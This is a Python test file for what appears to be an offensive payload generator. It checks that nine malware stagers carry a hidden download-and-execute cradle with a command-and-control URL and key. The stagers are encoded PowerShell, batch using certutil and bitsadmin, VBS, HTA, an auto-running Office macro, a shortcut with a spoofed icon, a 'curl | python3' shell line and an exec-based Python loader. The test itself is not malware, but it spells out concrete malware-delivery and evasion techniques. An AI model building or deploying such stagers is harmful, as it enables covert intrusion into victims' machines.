#!/usr/bin/env python3
"""test_payload_gen.py -- structural verification of every generated payload.

Cross-platform (no powershell needed): generates the full suite into a temp
dir and asserts format structure + that the encoded cradle decodes with the
right URL/C2/PSK baked in. The .ps1 files additionally get PowerShell
parse-checked locally (see session log), which CI cannot do on ubuntu.
"""
import base64
import importlib.util
import os
import shutil
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
TOOL = os.path.join(os.path.dirname(HERE), "tools", "make_payload.py")

URL = "http://10.9.8.7:9000/updater.exe"
C2 = "http://10.9.8.7:8443/gate"
PSK = "payload-unit-psk"
AUTH = "atok"


def load():
    spec = importlib.util.spec_from_file_location("mkpay", TOOL)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


def main():
    mp = load()
    tmp = tempfile.mkdtemp(prefix="sh_pay_")
    try:
        made = mp.build_all(URL, C2, PSK, AUTH, 300, tmp)
        assert len(made) == 9, "expected 9 payloads, got %d" % len(made)

        # encoded cradle: UTF-16LE b64, decodes with everything baked in
        b64 = made["stager.ps1.b64cmd"].strip()
        core = base64.b64decode(b64).decode("utf-16-le")
        for want in (URL, C2, PSK, AUTH, "--loop", "300",
                     "DownloadFile", "Start-Process", "-WindowStyle Hidden"):
            assert want in core, "cradle missing %r:\n%s" % (want, core)

        # ps1: semicolon-collapsed statements, url present
        ps = made["stager.ps1"]
        assert URL in ps and "$u=" in ps

        # bat: three download paths, min-start with args
        bat = made["stager.bat"]
        for want in ("certutil -urlcache", "bitsadmin /transfer",
                     "DownloadFile", "start \"\" /min", "--c2 " + C2):
            assert want in bat, "bat missing %r" % want

        # vbs / hta / macro: hidden powershell via WScript.Shell
        for name in ("stager.vbs", "stage.hta", "macro.txt"):
            t = made[name]
            assert "WScript.Shell" in t, "%s missing COM shell" % name
            assert "-w hidden -nop -e" in t, "%s missing encoded cmd" % name
        assert "Document_Open" in made["macro.txt"]
        assert "window.close" in made["stage.hta"]
        assert "<script language=\"VBScript\">" in made["stage.hta"]

        # every encoded command across formats decodes to the same cradle
        for name in ("stager.vbs", "stage.hta", "macro.txt", "make_lnk.ps1"):
            tok = [w for w in made[name].split() if len(w) > 200]
            assert tok, "%s carries no b64 blob" % name
            dec = base64.b64decode(tok[-1].strip('"')).decode("utf-16-le")
            assert dec == core, "%s cradle mismatch" % name

        # lnk builder: shortcut against powershell.exe, spoofed icon
        lnk = made["make_lnk.ps1"]
        assert "CreateShortcut" in lnk and "IconLocation" in lnk
        assert "$s.TargetPath='powershell.exe'" in lnk

        # sh: env-carried config + curl|python3
        sh = made["stage.sh"]
        assert ("SH_C2='%s'" % C2) in sh and PSK in sh and AUTH in sh
        assert "curl -fsSL %s | python3 - --loop 300" % URL in sh

        # py: valid python that compiles, memory-only delivery
        py = made["stage.py"]
        compile(py, "stage.py", "exec")
        assert "urllib.request" in py and "exec(" in py
        assert "'SH_C2': '%s'" % C2 in py

        print("[ok] 9/9 payloads: structure + embedded cradle consistent")
        print("[ok] encoded cradle carries url/c2/psk/auth/loop")
        return 0
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    sys.exit(main())
